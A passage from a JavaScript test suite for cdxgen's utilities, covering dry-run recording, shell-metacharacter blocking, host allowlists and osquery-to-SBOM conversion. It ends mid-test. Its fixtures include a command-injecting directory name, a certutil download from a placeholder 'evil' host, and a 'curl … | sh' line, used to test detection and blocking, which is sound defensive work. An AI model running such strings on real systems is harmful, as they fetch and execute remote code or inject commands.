import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { platform, tmpdir } from "node:os";
import path from "node:path";
import process from "node:process";

import esmock from "esmock";
import { assert, describe, it } from "poku";
import sinon from "sinon";

import {
  addEvidenceForImports,
  cdxgenAgent,
  collectExecutables,
  collectSharedLibs,
  convertOSQueryResults,
  getAllFiles,
  getRecordedActivities,
  isAllowedHttpHost,
  isDryRunError,
  readEnvironmentVariable,
  recordSensitiveFileRead,
  recordSymlinkResolution,
  resetRecordedActivities,
  safeExistsSync,
  safeMkdtempSync,
  safeRmSync,
  safeSpawnSync,
  safeUnlinkSync,
  safeWriteSync,
  setDryRunMode,
} from "../ecosystems/utils.js";

function createMockedProcess(envOverrides = {}) {
  const env = {
    ...process.env,
  };
  for (const [key, value] of Object.entries(envOverrides)) {
    if (value === undefined) {
      delete env[key];
    } else {
      env[key] = value;
    }
  }
  const mockedProcess = Object.create(process);
  mockedProcess.argv = [...process.argv];
  mockedProcess.env = env;
  return mockedProcess;
}

it("safeSpawnSync() returns a dry-run sentinel result when dry run mode is enabled", () => {
  setDryRunMode(true);
  resetRecordedActivities();
  try {
    const result = safeSpawnSync("node", ["--version"], {});
    assert.strictEqual(result.status, 1);
    assert.ok(isDryRunError(result.error));
    const executeActivity = getRecordedActivities().find(
      (activity) => activity.kind === "execute",
    );
    assert.ok(executeActivity);
    assert.strictEqual(executeActivity.status, "blocked");
  } finally {
    setDryRunMode(false);
    resetRecordedActivities();
  }
});

it("safeSpawnSync() does not classify non-probe -v commands as version checks", () => {
  setDryRunMode(true);
  resetRecordedActivities();
  try {
    safeSpawnSync("swift", ["package", "-v", "resolve"], {});
    const executeActivity = getRecordedActivities().find(
      (activity) => activity.kind === "execute",
    );
    assert.ok(executeActivity);
    assert.strictEqual(executeActivity.probeType, undefined);
    assert.ok(!/version check/i.test(executeActivity.reason));
  } finally {
    setDryRunMode(false);
    resetRecordedActivities();
  }
});

it("safeSpawnSync() blocks shell metacharacters with shell execution", () => {
  const markerFile = path.join(tmpdir(), "cdxgen-safe-spawn-shell-marker");
  const originalConsoleWarn = console.warn;
  const warnings = [];
  rmSync(markerFile, { force: true });
  resetRecordedActivities();
  console.warn = (message) => {
    warnings.push(message);
  };

  try {
    const result = safeSpawnSync("printf", ["blocked", ">", markerFile], {
      shell: true,
    });
    assert.strictEqual(result.status, 1);
    assert.ok(result.error);
    assert.match(result.error.message, /shell metacharacters/);
    assert.strictEqual(existsSync(markerFile), false);
    assert.ok(warnings.some((warning) => /Security Alert/.test(warning)));
  } finally {
    console.warn = originalConsoleWarn;
    resetRecordedActivities();
    rmSync(markerFile, { force: true });
  }
});

it("safeSpawnSync() reads CDXGEN_ALLOWED_COMMANDS once per invocation", () => {
  const originalAllowedCommands = process.env.CDXGEN_ALLOWED_COMMANDS;
  process.env.CDXGEN_ALLOWED_COMMANDS = "echo-cdxgen-test";
  setDryRunMode(true);
  resetRecordedActivities();
  try {
    safeSpawnSync("echo-cdxgen-test", ["value"], {});
    const envActivities = getRecordedActivities().filter(
      (activity) => activity.target === "process.env:CDXGEN_ALLOWED_COMMANDS",
    );
    assert.strictEqual(envActivities.length, 1);
    assert.strictEqual(envActivities[0].count, 1);
  } finally {
    if (originalAllowedCommands === undefined) {
      delete process.env.CDXGEN_ALLOWED_COMMANDS;
    } else {
      process.env.CDXGEN_ALLOWED_COMMANDS = originalAllowedCommands;
    }
    setDryRunMode(false);
    resetRecordedActivities();
  }
});

it("safeSpawnSync() records stdout and stderr byte sizes in debug mode", async () => {
  const mockedProcess = createMockedProcess({
    CDXGEN_ALLOWED_COMMANDS: "echo-cdxgen-test",
    CDXGEN_DEBUG_MODE: "debug",
    CDXGEN_SECURE_MODE: undefined,
    NODE_OPTIONS: undefined,
  });
  const utilsModule = await esmock(
    "../ecosystems/utils.js",
    {},
    {
      "node:child_process": {
        spawnSync: sinon.stub().returns({
          status: 0,
          stdout: "hello",
          stderr: "warn",
        }),
      },
      "node:process": {
        default: mockedProcess,
      },
    },
  );
  utilsModule.resetRecordedActivities();
  utilsModule.safeSpawnSync("echo-cdxgen-test", ["value"], {});
  const executeActivity = utilsModule
    .getRecordedActivities()
    .find(
      (activity) =>
        activity.kind === "execute" &&
        activity.target === "echo-cdxgen-test value",
    );
  assert.ok(executeActivity);
  assert.strictEqual(executeActivity.stdoutBytes, 5);
  assert.strictEqual(executeActivity.stderrBytes, 4);
  utilsModule.resetRecordedActivities();
});

it("safeExtractArchive() records source byte size in debug mode", async () => {
  const mockedProcess = createMockedProcess({
    CDXGEN_ALLOWED_COMMANDS: undefined,
    CDXGEN_DEBUG_MODE: "debug",
    CDXGEN_SECURE_MODE: undefined,
    NODE_OPTIONS: undefined,
  });
  const utilsModule = await esmock(
    "../ecosystems/utils.js",
    {},
    {
      "node:process": {
        default: mockedProcess,
      },
    },
  );
  const tempDir = mkdtempSync(path.join(tmpdir(), "cdxgen-archive-trace-"));
  const sourcePath = path.join(tempDir, "archive.zip");
  const targetPath = path.join(tempDir, "extracted");
  mkdirSync(targetPath, { recursive: true });
  writeFileSync(sourcePath, "abc");
  utilsModule.resetRecordedActivities();
  await utilsModule.safeExtractArchive(
    sourcePath,
    targetPath,
    async () => {
      writeFileSync(path.join(targetPath, "a.txt"), "hello");
      mkdirSync(path.join(targetPath, "nested"), { recursive: true });
      writeFileSync(path.join(targetPath, "nested", "b.txt"), "xy");
    },
    "unzip",
  );
  const archiveActivity = utilsModule
    .getRecordedActivities()
    .find(
      (activity) =>
        activity.kind === "unzip" &&
        activity.target === `${sourcePath} -> ${targetPath}`,
    );
  assert.ok(archiveActivity);
  assert.strictEqual(archiveActivity.status, "completed");
  assert.strictEqual(archiveActivity.sourceBytes, 3);
  rmSync(tempDir, { recursive: true, force: true });
});

it("safeExtractArchive() records failed extraction activity in debug mode", async () => {
  const mockedProcess = createMockedProcess({
    CDXGEN_ALLOWED_COMMANDS: undefined,
    CDXGEN_DEBUG_MODE: "debug",
    CDXGEN_SECURE_MODE: undefined,
    NODE_OPTIONS: undefined,
  });
  const utilsModule = await esmock(
    "../ecosystems/utils.js",
    {},
    {
      "node:process": {
        default: mockedProcess,
      },
    },
  );
  const tempDir = mkdtempSync(path.join(tmpdir(), "cdxgen-archive-trace-"));
  const sourcePath = path.join(tempDir, "archive.tar");
  const targetPath = path.join(tempDir, "extracted");
  mkdirSync(targetPath, { recursive: true });
  writeFileSync(sourcePath, "abcd");
  utilsModule.resetRecordedActivities();
  const extractionError = new Error("permission denied");
  extractionError.code = "EACCES";
  await assert.rejects(
    utilsModule.safeExtractArchive(
      sourcePath,
      targetPath,
      async () => {
        throw extractionError;
      },
      "untar",
    ),
    extractionError,
  );
  const archiveActivity = utilsModule
    .getRecordedActivities()
    .find(
      (activity) =>
        activity.kind === "untar" &&
        activity.target === `${sourcePath} -> ${targetPath}`,
    );
  assert.ok(archiveActivity);
  assert.strictEqual(archiveActivity.status, "failed");
  assert.strictEqual(archiveActivity.errorCode, "EACCES");
  assert.strictEqual(archiveActivity.sourceBytes, 4);
  rmSync(tempDir, { recursive: true, force: true });
});

it("records dry-run environment variable reads via helper access", () => {
  const originalEnvValue = process.env.CDXGEN_TEST_ENV_READ;
  process.env.CDXGEN_TEST_ENV_READ = "trace-me";
  setDryRunMode(true);
  resetRecordedActivities();
  try {
    readEnvironmentVariable("CDXGEN_TEST_ENV_READ");
    readEnvironmentVariable("CDXGEN_TEST_ENV_READ");
    const activities = getRecordedActivities().filter(
      (activity) => activity.target === "process.env:CDXGEN_TEST_ENV_READ",
    );
    assert.strictEqual(activities.length, 1);
    assert.strictEqual(activities[0].kind, "env");
    assert.match(activities[0].reason, /2 times/);
  } finally {
    if (originalEnvValue === undefined) {
      delete process.env.CDXGEN_TEST_ENV_READ;
    } else {
      process.env.CDXGEN_TEST_ENV_READ = originalEnvValue;
    }
    setDryRunMode(false);
    resetRecordedActivities();
  }
});

it("isAllowedHttpHost() honors exact and wildcard host allowlists", () => {
  const originalAllowedHosts = process.env.CDXGEN_ALLOWED_HOSTS;
  try {
    process.env.CDXGEN_ALLOWED_HOSTS = "example.com,*.trusted.test";
    assert.strictEqual(isAllowedHttpHost("example.com"), true);
    assert.strictEqual(isAllowedHttpHost("api.trusted.test"), true);
    assert.strictEqual(isAllowedHttpHost("trusted.test"), false);
    assert.strictEqual(isAllowedHttpHost("evil.com"), false);
  } finally {
    if (originalAllowedHosts === undefined) {
      delete process.env.CDXGEN_ALLOWED_HOSTS;
    } else {
      process.env.CDXGEN_ALLOWED_HOSTS = originalAllowedHosts;
    }
  }
});

it("deduplicates sensitive file read activity entries in dry-run mode", () => {
  setDryRunMode(true);
  resetRecordedActivities();
  try {
    recordSensitiveFileRead("/tmp/docker/config.json", {
      label: "Docker credential file",
    });
    recordSensitiveFileRead("/tmp/docker/config.json", {
      label: "Docker credential file",
    });
    const activities = getRecordedActivities().filter(
      (activity) => activity.target === "/tmp/docker/config.json",
    );
    assert.strictEqual(activities.length, 1);
    assert.strictEqual(activities[0].kind, "read");
    assert.match(activities[0].reason, /2 times/);
  } finally {
    setDryRunMode(false);
    resetRecordedActivities();
  }
});

it("records classified manifest and config inspections in dry-run mode", () => {
  const tmpRoot = mkdtempSync(path.join(tmpdir(), "cdxgen-dry-run-inspect-"));
  const packageJsonFile = path.join(tmpRoot, "package.json");
  const settingsXmlFile = path.join(tmpRoot, "settings.xml");
  writeFileSync(packageJsonFile, "{}");
  writeFileSync(settingsXmlFile, "<settings />");
  setDryRunMode(true);
  resetRecordedActivities();
  try {
    assert.ok(safeExistsSync(packageJsonFile));
    assert.ok(safeExistsSync(settingsXmlFile));
    const activities = getRecordedActivities().filter((activity) =>
      [packageJsonFile, settingsXmlFile].includes(activity.target),
    );
    assert.strictEqual(activities.length, 2);
    assert.deepStrictEqual(
      activities.map((activity) => activity.kind),
      ["inspect", "inspect"],
    );
    assert.deepStrictEqual(
      activities.map((activity) => activity.classification),
      ["manifest", "config"],
    );
  } finally {
    setDryRunMode(false);
    resetRecordedActivities();
    rmSync(tmpRoot, { force: true, recursive: true });
  }
});

it("records recursive file discovery activity in dry-run mode", () => {
  const tmpRoot = mkdtempSync(path.join(tmpdir(), "cdxgen-dry-run-glob-"));
  const packageJsonFile = path.join(tmpRoot, "package.json");
  writeFileSync(packageJsonFile, "{}");
  setDryRunMode(true);
  resetRecordedActivities();
  try {
    const files = getAllFiles(tmpRoot, "**/package.json");
    assert.deepStrictEqual(files, [packageJsonFile]);
    const activities = getRecordedActivities().filter((activity) =>
      activity.target.includes("**/package.json"),
    );
    assert.strictEqual(activities.length, 1);
    assert.strictEqual(activities[0].kind, "discover");
    assert.strictEqual(activities[0].discoveryType, "manifest-discovery");
  } finally {
    setDryRunMode(false);
    resetRecordedActivities();
    rmSync(tmpRoot, { force: true, recursive: true });
  }
});

it("records suspicious discovered paths with shell metacharacters in dry-run mode", () => {
  const tmpRoot = mkdtempSync(
    path.join(tmpdir(), "cdxgen-dry-run-shell-path-"),
  );
  const shellIfs = "$" + "{IFS}";
  const maliciousDirName =
    platform() === "win32"
      ? "evil&echo%CDXGEN_GITURL_E2E_MARKER%&rem"
      : `evil;cd${shellIfs}..;printf${shellIfs}marker>CDXGEN_GITURL_E2E_MARKER;#`;
  const maliciousDir = path.join(tmpRoot, maliciousDirName);
  const pomFile = path.join(maliciousDir, "pom.xml");
  mkdirSync(maliciousDir, { recursive: true });
  writeFileSync(pomFile, "<project />");
  setDryRunMode(true);
  resetRecordedActivities();
  try {
    assert.deepStrictEqual(getAllFiles(tmpRoot, "**/pom.xml"), [pomFile]);
    const suspiciousActivity = getRecordedActivities().find(
      (activity) => activity.classification === "suspicious-path",
    );
    assert.ok(suspiciousActivity);
    assert.strictEqual(suspiciousActivity.risk, "shell-metacharacters");
    assert.strictEqual(suspiciousActivity.target, pomFile);
    assert.match(suspiciousActivity.reason, /shell metacharacters/);
  } finally {
    setDryRunMode(false);
    resetRecordedActivities();
    rmSync(tmpRoot, { force: true, recursive: true });
  }
});

it("records updated discovery activity when a repeated glob match count changes", () => {
  const tmpRoot = mkdtempSync(path.join(tmpdir(), "cdxgen-dry-run-glob-"));
  const packageJsonFile = path.join(tmpRoot, "package.json");
  const nestedDir = path.join(tmpRoot, "nested");
  const nestedPackageJsonFile = path.join(nestedDir, "package.json");
  writeFileSync(packageJsonFile, "{}");
  setDryRunMode(true);
  resetRecordedActivities();
  try {
    getAllFiles(tmpRoot, "**/package.json");
    mkdirSync(nestedDir, { recursive: true });
    writeFileSync(nestedPackageJsonFile, "{}");
    getAllFiles(tmpRoot, "**/package.json");
    const activities = getRecordedActivities().filter((activity) =>
      activity.target.includes("**/package.json"),
    );
    assert.strictEqual(activities.length, 2);
    assert.deepStrictEqual(
      activities.map((activity) => activity.matchedCount),
      [1, 2],
    );
  } finally {
    setDryRunMode(false);
    resetRecordedActivities();
    rmSync(tmpRoot, { force: true, recursive: true });
  }
});

it("dry-run filesystem wrappers do not mutate the filesystem", () => {
  const tmpRoot = mkdtempSync(path.join(tmpdir(), "cdxgen-dry-run-"));
  const fileToKeep = path.join(tmpRoot, "keep.txt");
  const fileToSkip = path.join(tmpRoot, "skip.txt");
  const dirToKeep = path.join(tmpRoot, "keep-dir");
  writeFileSync(fileToKeep, "hello");
  mkdirSync(dirToKeep, { recursive: true });
  setDryRunMode(true);
  resetRecordedActivities();
  try {
    const tempPath = safeMkdtempSync(path.join(tmpRoot, "temp-"));
    safeWriteSync(fileToSkip, "world");
    safeUnlinkSync(fileToKeep);
    safeRmSync(dirToKeep, { recursive: true, force: true });
    assert.ok(!existsSync(fileToSkip));
    assert.ok(existsSync(fileToKeep));
    assert.ok(existsSync(dirToKeep));
    assert.ok(!existsSync(tempPath));
    const activities = getRecordedActivities();
    assert.deepStrictEqual(
      activities.map((activity) => activity.kind),
      ["temp-dir", "write", "cleanup", "cleanup"],
    );
    assert.ok(activities.every((activity) => activity.status === "blocked"));
  } finally {
    setDryRunMode(false);
    resetRecordedActivities();
    rmSync(tmpRoot, { force: true, recursive: true });
  }
});

it("safeWriteSync() honors explicit fs.write permission for output files", async () => {
  const tmpRoot = mkdtempSync(path.join(tmpdir(), "cdxgen-secure-write-"));
  const outputFile = path.join(tmpRoot, "bom.json");
  const hasPermissionStub = sinon.stub().callsFake((scope, filePath) => {
    return (
      scope === "fs.read" || (scope === "fs.write" && filePath === outputFile)
    );
  });
  const mockedProcess = createMockedProcess({
    CDXGEN_DEBUG_MODE: "debug",
    CDXGEN_SECURE_MODE: "true",
  });
  mockedProcess.permission = { has: hasPermissionStub };
  try {
    const {
      getRecordedActivities: getRecordedActivitiesMocked,
      resetRecordedActivities: resetRecordedActivitiesMocked,
      safeWriteSync: safeWriteSyncMocked,
    } = await esmock(
      "../ecosystems/utils.js",
      {},
      {
        "node:process": {
          default: mockedProcess,
        },
      },
    );
    resetRecordedActivitiesMocked();
    safeWriteSyncMocked(outputFile, "{}");
    assert.strictEqual(readFileSync(outputFile, "utf-8"), "{}");
    assert.strictEqual(getRecordedActivitiesMocked()[0].status, "completed");
  } finally {
    rmSync(tmpRoot, { force: true, recursive: true });
  }
});

it("cdxgenAgent records completed and failed network activity outcomes", async () => {
  let setDryRunModeMocked;
  try {
    const {
      cdxgenAgent,
      getRecordedActivities: getRecordedActivitiesMocked,
      resetRecordedActivities: resetRecordedActivitiesMocked,
      setDryRunMode: mockedSetDryRunMode,
    } = await esmock(
      "../ecosystems/utils.js",
      {},
      {
        "./httpClient.js": {
          createHttpClient: sinon.stub().callsFake((options) => {
            return {
              hooks: options.hooks,
            };
          }),
        },
      },
    );
    setDryRunModeMocked = mockedSetDryRunMode;
    const afterResponseHook = cdxgenAgent.hooks.afterResponse[0];
    const beforeErrorHook = cdxgenAgent.hooks.beforeError[0];

    setDryRunModeMocked(true);
    resetRecordedActivitiesMocked();
    const successUrl = "https://example.com/success";
    const successOptions = {
      context: {
        activityTarget: successUrl,
      },
      url: new URL(successUrl),
    };
    afterResponseHook({
      request: {
        options: successOptions,
      },
      statusCode: 200,
      url: successUrl,
    });
    assert.strictEqual(getRecordedActivitiesMocked()[0].status, "completed");
    assert.strictEqual(getRecordedActivitiesMocked()[0].target, successUrl);

    resetRecordedActivitiesMocked();
    const failureUrl = "https://example.com/failure";
    const failureOptions = {
      context: {
        activityTarget: failureUrl,
      },
      url: new URL(failureUrl),
    };
    const returnedError = beforeErrorHook({
      message: "Request failed with status code 500",
      options: failureOptions,
    });
    assert.match(returnedError.message, /status code 500/);
    const failureActivities = getRecordedActivitiesMocked();
    assert.strictEqual(failureActivities.length, 1);
    assert.strictEqual(failureActivities[0].status, "failed");
    assert.strictEqual(failureActivities[0].target, failureUrl);
  } finally {
    if (setDryRunModeMocked) {
      setDryRunModeMocked(false);
    }
  }
});

it("cdxgenAgent throws (not just logs) for a disallowed host outside dry-run", () => {
  const originalAllowedHosts = process.env.CDXGEN_ALLOWED_HOSTS;
  try {
    // Regression guard: the beforeRequest hook must THROW to abort a blocked
    // host. Returning an aborted AbortController is a no-op and lets the
    // request through, silently bypassing CDXGEN_ALLOWED_HOSTS.
    process.env.CDXGEN_ALLOWED_HOSTS = "example.com";
    const beforeRequestHook =
      cdxgenAgent.defaults.options.hooks.beforeRequest[0];
    setDryRunMode(false);
    resetRecordedActivities();
    let thrown;
    try {
      beforeRequestHook({
        context: {},
        url: new URL("https://evil.example.org/resource"),
      });
    } catch (err) {
      thrown = err;
    }
    assert.ok(thrown, "Expected a disallowed host to throw");
    assert.strictEqual(thrown.code, "CDXGEN_HOST_BLOCKED");
  } finally {
    if (originalAllowedHosts === undefined) {
      delete process.env.CDXGEN_ALLOWED_HOSTS;
    } else {
      process.env.CDXGEN_ALLOWED_HOSTS = originalAllowedHosts;
    }
    resetRecordedActivities();
  }
});

it("cdxgenAgent reads CDXGEN_ALLOWED_HOSTS once per request", () => {
  const originalAllowedHosts = process.env.CDXGEN_ALLOWED_HOSTS;
  try {
    process.env.CDXGEN_ALLOWED_HOSTS = "example.com";
    const beforeRequestHook =
      cdxgenAgent.defaults.options.hooks.beforeRequest[0];

    setDryRunMode(true);
    resetRecordedActivities();
    assert.throws(() =>
      beforeRequestHook({
        context: {},
        url: new URL("https://example.com/resource"),
      }),
    );
    const envActivities = getRecordedActivities().filter(
      (activity) => activity.target === "process.env:CDXGEN_ALLOWED_HOSTS",
    );
    assert.strictEqual(envActivities.length, 1);
    assert.strictEqual(envActivities[0].count, 1);
  } finally {
    if (originalAllowedHosts === undefined) {
      delete process.env.CDXGEN_ALLOWED_HOSTS;
    } else {
      process.env.CDXGEN_ALLOWED_HOSTS = originalAllowedHosts;
    }
    setDryRunMode(false);
    resetRecordedActivities();
  }
});

describe("convertOSQueryResults", () => {
  it("includes the osquery 5.23.0 query pack additions across platform profiles", () => {
    const linuxQueries = JSON.parse(
      readFileSync(
        new URL("../../data/queries.json", import.meta.url),
        "utf-8",
      ),
    );
    const darwinQueries = JSON.parse(
      readFileSync(
        new URL("../../data/queries-darwin.json", import.meta.url),
        "utf-8",
      ),
    );
    const windowsQueries = JSON.parse(
      readFileSync(
        new URL("../../data/queries-win.json", import.meta.url),
        "utf-8",
      ),
    );

    assert.ok(linuxQueries.npm_packages);
    assert.ok(linuxQueries.secureboot_certificates);
    assert.ok(linuxQueries.apt_ppa_sources);
    assert.ok(linuxQueries.sysctl_hardening);
    assert.ok(linuxQueries.mount_hardening);
    assert.ok(linuxQueries.trusted_gpg_keys);
    assert.ok(darwinQueries.gatekeeper);
    assert.ok(darwinQueries.npm_packages);
    assert.match(
      darwinQueries.package_bom.query,
      /WHERE path IN \(SELECT REPLACE\(package_receipts\.path, '.plist', '.bom'\) FROM package_receipts JOIN file ON file\.path = REPLACE\(package_receipts\.path, '.plist', '.bom'\) WHERE package_receipts\.path LIKE '%.plist' AND file\.size <= 52428800\)/i,
    );
    assert.match(linuxQueries.trusted_gpg_keys.query, /file\.directory/);
    assert.match(linuxQueries.trusted_gpg_keys.query, /hash\.sha256/);
    assert.ok(windowsQueries.process_open_handles_snapshot);
  });

  it("includes the osquery 5.24.0 query pack additions across platform profiles", () => {
    const readPack = (name) =>
      JSON.parse(
        readFileSync(new URL(`../../data/${name}`, import.meta.url), "utf-8"),
      );
    const linuxQueries = readPack("queries.json");
    const darwinQueries = readPack("queries-darwin.json");
    const windowsQueries = readPack("queries-win.json");
    const cbomQueries = readPack("cbomosdb-queries.json");

    for (const category of [
      "pacman_packages",
      "snap_packages",
      "flatpak_packages",
      "homebrew_packages",
    ]) {
      assert.ok(linuxQueries[category], category);
    }
    assert.strictEqual(linuxQueries.pacman_packages.purlType, "alpm");
    assert.strictEqual(linuxQueries.snap_packages.purlType, "snap");
    assert.strictEqual(linuxQueries.flatpak_packages.purlType, "flatpak");
    // A flatpak is named by its application ID, which the query selects as
    // the row's name.
    assert.match(linuxQueries.flatpak_packages.query, /app_id as name/i);
    assert.strictEqual(darwinQueries.macports_packages.purlType, "macports");
    assert.ok(!windowsQueries.homebrew_packages);
    // Homebrew now runs on Linux with the entry macOS has always used.
    assert.deepStrictEqual(
      linuxQueries.homebrew_packages,
      darwinQueries.homebrew_packages,
    );
    // The tables of every platform share one entry in each pack.
    for (const category of [
      "ai_agent_skills",
      "gpu_info",
      "chrome_search_engines",
    ]) {
      assert.deepStrictEqual(linuxQueries[category], darwinQueries[category]);
      assert.deepStrictEqual(linuxQueries[category], windowsQueries[category]);
    }
    // Skills of every user, then the system-wide ones a users join drops.
    assert.match(
      linuxQueries.ai_agent_skills.query,
      /FROM users JOIN ai_agent_skills USING \(uid\)/,
    );
    assert.match(
      linuxQueries.ai_agent_skills.query,
      /UNION ALL .* WHERE ai_agent_skills\.scope = 'system'/,
    );
    assert.match(linuxQueries.ai_agent_skills.query, /hash\.sha256/);
    assert.strictEqual(linuxQueries.ai_agent_skills.componentType, "file");
    assert.strictEqual(linuxQueries.gpu_info.componentType, "device");
    assert.match(
      windowsQueries.windows_bitlocker_info.query,
      /\bprotector_types\b/,
    );
    assert.strictEqual(cbomQueries.pacman_packages.purlType, "alpm");
    assert.strictEqual(cbomQueries.macports_packages.purlType, "macports");
    // gpu_metrics changes on every run, and the bpf event tables are gone.
    for (const pack of [linuxQueries, darwinQueries, windowsQueries]) {
      for (const queryObj of Object.values(pack)) {
        assert.doesNotMatch(
          queryObj.query,
          /\b(gpu_metrics|bpf_process_events|bpf_socket_events)\b/,
        );
      }
    }
  });

  it("should model trusted linux repository keys as cryptographic assets", () => {
    const components = convertOSQueryResults(
      "trusted_gpg_keys",
      {
        purlType: "generic",
        componentType: "cryptographic-asset",
      },
      [
        {
          name: "debian-archive-keyring.gpg",
          version: "c".repeat(64),
          description: "/usr/share/keyrings/debian-archive-keyring.gpg",
          path: "/usr/share/keyrings/debian-archive-keyring.gpg",
          sha1: "b".repeat(40),
          sha256: "c".repeat(64),
          trust_domain: "apt",
        },
      ],
      false,
    );
    assert.strictEqual(components.length, 1);
    assert.strictEqual(components[0].type, "cryptographic-asset");
    assert.strictEqual(components[0].purl, undefined);
    assert.ok(
      components[0]["bom-ref"].startsWith(
        "crypto/related-crypto-material/public-key/",
      ),
    );
    assert.strictEqual(
      components[0].cryptoProperties?.assetType,
      "related-crypto-material",
    );
    assert.strictEqual(
      components[0].cryptoProperties?.relatedCryptoMaterialProperties?.type,
      "public-key",
    );
    assert.ok(
      components[0].hashes.some(
        (hash) => hash.alg === "SHA-256" && hash.content === "c".repeat(64),
      ),
    );
  });

  it("should preserve the full certificate crypto properties shape", () => {
    const components = convertOSQueryResults(
      "certificates",
      {
        purlType: "generic",
        componentType: "cryptographic-asset",
      },
      [
        {
          name: "ACCVRAIZ1",
          path: "/etc/ssl/certs/ACCVRAIZ1.crt",
          serial: "5EC3B7A6437FA4E0",
          subject: "/CN=ACCVRAIZ1/OU=PKIACCV/O=ACCV/C=ES",
          issuer: "/CN=ACCVRAIZ1/OU=PKIACCV/O=ACCV/C=ES",
          not_valid_before: "2011-05-05T09:37:37.000Z",
          not_valid_after: "2030-12-31T09:37:37.000Z",
          sha1: "1".repeat(40),
        },
      ],
      false,
    );
    assert.strictEqual(components.length, 1);
    assert.strictEqual(components[0].type, "cryptographic-asset");
    assert.strictEqual(
      components[0].cryptoProperties?.assetType,
      "certificate",
    );
    assert.deepStrictEqual(
      components[0].cryptoProperties?.certificateProperties,
      {
        serialNumber: "5EC3B7A6437FA4E0",
        subjectName: "/CN=ACCVRAIZ1/OU=PKIACCV/O=ACCV/C=ES",
        issuerName: "/CN=ACCVRAIZ1/OU=PKIACCV/O=ACCV/C=ES",
        notValidBefore: "2011-05-05T09:37:37.000Z",
        notValidAfter: "2030-12-31T09:37:37.000Z",
        certificateFormat: "X.509",
        certificateFileExtension: "crt",
        fingerprint: { alg: "SHA-1", content: "1".repeat(40) },
      },
    );
  });

  it("should ignore empty occurrence locations when adding import evidence", async () => {
    const pkgList = [{ name: "lodash" }];
    const allImports = {
      lodash: [
        {
          fileName: "   ",
          importedAs: "lodash",
          importedModules: ["map"],
        },
      ],
    };

    await addEvidenceForImports(pkgList, allImports, {}, false);

    assert.strictEqual(pkgList[0].scope, "required");
    assert.strictEqual(pkgList[0].evidence, undefined);
    assert.deepStrictEqual(pkgList[0].properties, [
      {
        name: "internal:ImportedModules",
        value: "lodash,lodash/map",
      },
    ]);
  });

  it("should use identifier as package name for chrome-extension purl type", () => {
    const components = convertOSQueryResults(
      "chrome_extensions",
      {
        purlType: "chrome-extension",
        componentType: "application",
      },
      [
        {
          name: "Human Readable Name",
          identifier: "HLEPFOOHEGKHHMJIEOECHADDAEJAOKHF",
          version: "25.7.1",
          profile: "Default",
        },
      ],
      false,
    );
    assert.strictEqual(components.length, 1);
    assert.strictEqual(components[0].name, "hlepfoohegkhhmjieoechaddaejaokhf");
    assert.strictEqual(
      components[0].purl,
      "pkg:chrome-extension/hlepfoohegkhhmjieoechaddaejaokhf@25.7.1",
    );
    const propNames = components[0].properties.map((prop) => prop.name);
    assert.ok(propNames.includes("name"));
    assert.ok(propNames.includes("identifier"));
  });

  it("should omit purl for osquery data components while keeping a stable bom-ref", () => {
    const components = convertOSQueryResults(
      "authorized_keys_snapshot",
      {
        purlType: "swid",
        componentType: "data",
      },
      [
        {
          name: "root",
          version: "ssh-ed25519",
          description: "ops@example.invalid",
          key_file: "/root/.ssh/authorized_keys",
          uid: "0",
        },
      ],
      false,
    );
    assert.strictEqual(components.length, 1);
    assert.strictEqual(components[0].purl, undefined);
    assert.strictEqual(
      components[0]["bom-ref"],
      "osquery:authorized_keys_snapshot:data:root@ssh-ed25519[key_file=/root/.ssh/authorized_keys]",
    );
  });

  it("should add LOLBAS properties to suspicious windows osquery rows", () => {
    const components = convertOSQueryResults(
      "windows_run_keys",
      {
        purlType: "swid",
        componentType: "data",
      },
      [
        {
          name: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
          description:
            "powershell -enc AAAA; certutil.exe -urlcache -f https://evil/p.ps1 p.ps1",
        },
      ],
      false,
    );
    assert.strictEqual(components.length, 1);
    assert.strictEqual(components[0].purl, undefined);
    assert.strictEqual(
      components[0]["bom-ref"],
      "osquery:windows_run_keys:data:HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater@unknown",
    );
    const propertyMap = Object.fromEntries(
      components[0].properties.map((property) => [
        property.name,
        property.value,
      ]),
    );
    assert.strictEqual(propertyMap["cdx:lolbas:matched"], "true");
    assert.ok(propertyMap["cdx:lolbas:names"].includes("powershell.exe"));
    assert.ok(propertyMap["cdx:lolbas:names"].includes("certutil.exe"));
    assert.ok(propertyMap["cdx:lolbas:functions"].includes("download"));
    assert.ok(propertyMap["cdx:lolbas:attackTechniques"].includes("T1059.001"));
  });

  it("should add GTFOBins properties to suspicious Linux osquery rows", () => {
    if (platform() !== "linux") {
      return;
    }
    const components = convertOSQueryResults(
      "sudo_executions",
      {
        purlType: "swid",
        componentType: "application",
      },
      [
        {
          name: "bash",
          path: "/usr/bin/bash",
          cmdline: "bash -c 'curl https://example.invalid/p.sh | sh'",
          parent_cmdline: "sudo bash -c payload",
        },
      ],
      false,
    );
    assert.strictEqual(components.length, 1);
    assert.ok(components[0].purl?.startsWith("pkg:swid/bash"));
    const propertyMap = Object.fromEntries(
      components[0].properties.map((property) => [
        property.name,
        property.value,
      ]),
    );
    assert.strictEqual(propertyMap["cdx:gtfobins:matched"], "true");
    assert.ok(propertyMap["cdx:gtfobins:names"].includes("bash"));
    assert.ok(propertyMap["cdx:gtfobins:functions"].includes("shell"));
    assert.ok(
      propertyMap["cdx:gtfobins:queryCategory"].includes("sudo_executions"),
    );
  });

  it("collectExecutables() prefers usr-merged executable paths", () => {
    if (process.platform === "win32") {
      return;
    }
    const tempDir = mkdtempSync(path.join(tmpdir(), "cdxgen-executables-"));
    try {
      mkdirSync(path.join(tempDir, "usr", "bin"), { recursive: true });
      mkdirSync(path.join(tempDir, "usr", "sbin"), { recursive: true });
      writeFileSync(path.join(tempDir, "usr", "bin", "which"), "#!/bin/sh\n");
      writeFileSync(
        path.join(tempDir, "usr", "sbin", "zramctl"),
        "#!/bin/sh\n",
      );
      chmodSync(path.join(tempDir, "usr", "bin", "which"), 0o755);
      chmodSync(path.join(tempDir, "usr", "sbin", "zramctl"), 0o755);
      symlinkSync(path.join(tempDir, "usr", "bin"), path.join(tempDir, "bin"));
      symlinkSync(
        path.join(tempDir, "usr", "sbin"),
        path.join(tempDir, "sbin"),
      );

      const result = collectExecutables(tempDir, [
        "/bin",
        "/usr/bin",
        "/sbin",
        "/usr/sbin",
      ]);

